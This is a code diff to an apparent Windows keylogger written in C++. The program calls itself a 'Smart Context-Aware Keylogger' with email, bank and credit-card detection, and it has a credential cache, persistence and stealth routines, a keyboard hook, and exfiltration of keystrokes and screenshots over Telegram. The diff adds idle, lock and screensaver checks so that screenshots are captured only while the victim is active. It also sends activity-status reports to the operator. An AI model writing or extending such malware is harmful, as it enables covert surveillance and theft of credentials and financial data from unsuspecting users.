@@ -32,6 +32,29 @@ FILETIME lastScreenshot = {0};
 std::wstring activeWindowTitle;
 std::map<std::wstring, std::wstring> credentialCache;
 
+// ==================== NEW: IDLE DETECTION ====================
+DWORD GetIdleTimeSeconds() {
+    LASTINPUTINFO lii;
+    lii.cbSize = sizeof(LASTINPUTINFO);
+    GetLastInputInfo(&lii);
+    return (GetTickCount() - lii.dwTime) / 1000; // Return idle time in seconds
+}
+
+bool IsScreenLocked() {
+    HDESK hDesk = OpenInputDesktop(0, FALSE, DESKTOP_SWITCHDESKTOP);
+    if (hDesk == NULL) {
+        return true; // Cannot access desktop = likely locked
+    }
+    CloseDesktop(hDesk);
+    return false;
+}
+
+bool IsScreensaverActive() {
+    BOOL bActive = FALSE;
+    SystemParametersInfo(SPI_GETSCREENSAVERRUNNING, 0, &bActive, 0);
+    return bActive != FALSE;
+}
+
 // ==================== SMART CONTEXT DETECTOR ====================
 class ContextAwareDetector {
 private:
@@ -447,6 +470,70 @@ void send_screenshot() {
     screenshotBuffer.clear();
 }
 
+// ==================== NEW: SMART SCREENSHOT LOGIC ====================
+bool should_take_screenshot() {
+    DWORD idleSeconds = GetIdleTimeSeconds();
+    
+    // Don't take screenshots if:
+    // 1. Computer idle for more than 10 minutes
+    if (idleSeconds > 600) { // 10 minutes
+        return false;
+    }
+    
+    // 2. Screen is locked
+    if (IsScreenLocked()) {
+        return false;
+    }
+    
+    // 3. Screensaver is active
+    if (IsScreensaverActive()) {
+        return false;
+    }
+    
+    // 4. Check if window title is empty (no active window)
+    if (activeWindowTitle.empty() || activeWindowTitle == L"") {
+        return false;
+    }
+    
+    // 5. Check if it's a system window (like Start Menu, Task Manager)
+    std::wstring lowerTitle = activeWindowTitle;
+    std::transform(lowerTitle.begin(), lowerTitle.end(), lowerTitle.begin(), ::towlower);
+    
+    // Skip useless system windows
+    if (lowerTitle.find(L"task manager") != std::wstring::npos ||
+        lowerTitle.find(L"start") != std::wstring::npos ||
+        lowerTitle.find(L"notification") != std::wstring::npos ||
+        lowerTitle.find(L"action center") != std::wstring::npos) {
+        return false;
+    }
+    
+    // Adjust frequency based on idle time
+    static DWORD lastScreenshotTime = 0;
+    DWORD currentTime = GetTickCount();
+    
+    if (idleSeconds < 60) { // Very active (<1 minute idle)
+        // Normal frequency: at least 60 seconds between screenshots
+        if (currentTime - lastScreenshotTime > 60000) {
+            lastScreenshotTime = currentTime;
+            return true;
+        }
+    } else if (idleSeconds < 300) { // Somewhat idle (1-5 minutes)
+        // Reduced frequency: every 5 minutes
+        if (currentTime - lastScreenshotTime > 300000) {
+            lastScreenshotTime = currentTime;
+            return true;
+        }
+    } else { // Idle 5-10 minutes
+        // Minimal frequency: every 10 minutes
+        if (currentTime - lastScreenshotTime > 600000) {
+            lastScreenshotTime = currentTime;
+            return true;
+        }
+    }
+    
+    return false;
+}
+
 // ==================== PERSISTENCE & STEALTH ====================
 void persistence() {
     HKEY hKey;
@@ -486,7 +573,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
     persistence();
     
     if (init_winhttp()) {
-        send_telegram(L"🚀 [Changes v2.0] ACTIVATED\n🕵️ Smart Context-Aware Keylogger\n📧 Email/Bank/Credit Card Detection");
+        send_telegram(L"🚀 [Changes v2.0] ACTIVATED\n🕵️ Smart Context-Aware Keylogger\n📧 Email/Bank/Credit Card Detection\n⚡ Smart Screenshot Mode Enabled");
         
         // Install keyboard hook (MISSING IN ORIGINAL!)
         if (!install_keyboard_hook()) {
@@ -499,6 +586,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
         
         SYSTEMTIME st;
         DWORD lastKeyProcess = GetTickCount();
+        DWORD lastActiveCheck = GetTickCount();
+        bool wasActive = true;
         
         // Message loop required for low-level keyboard hooks
         MSG msg;
@@ -526,18 +615,39 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLi
                 LeaveCriticalSection(&clipLock);
             }
             
-            // Screenshot every 60 seconds
+            // Check activity status periodically
+            if (GetTickCount() - lastActiveCheck > 30000) { // Every 30 seconds
+                DWORD idleSeconds = GetIdleTimeSeconds();
+                bool isActive = (idleSeconds < 300); // Active if idle < 5 minutes
+                
+                if (wasActive && !isActive) {
+                    // Went from active to idle
+                    send_telegram(L"💤 [SYSTEM] Computer entering idle mode");
+                } else if (!wasActive && isActive) {
+                    // Went from idle to active
+                    send_telegram(L"⚡ [SYSTEM] Computer is now active");
+                }
+                wasActive = isActive;
+                lastActiveCheck = GetTickCount();
+            }
+            
+            // Smart screenshot logic
             GetSystemTime(&st);
             FILETIME now;
             SystemTimeToFileTime(&st, &now);
             ULARGE_INTEGER nowUL = {now.dwLowDateTime, now.dwHighDateTime};
             ULARGE_INTEGER lastUL = {lastScreenshot.dwLowDateTime, lastScreenshot.dwHighDateTime};
             
-            if ((nowUL.QuadPart - lastUL.QuadPart) > 600000000LL) { // ~60 seconds
-                capture_screenshot();
-                send_screenshot();
-                send_telegram(L"📸 [SCREENSHOT] " + activeWindowTitle);
-                lastScreenshot = now;
+            if ((nowUL.QuadPart - lastUL.QuadPart) > 600000000LL) { // ~60 seconds minimum
+                if (should_take_screenshot()) {
+                    capture_screenshot();
+                    send_screenshot();
+                    send_telegram(L"📸 [SCREENSHOT] " + activeWindowTitle);
+                    lastScreenshot = now;
+                } else {
+                    // Update timestamp but don't take screenshot
+                    lastScreenshot = now;
+                }
             }
             
             Sleep(100);
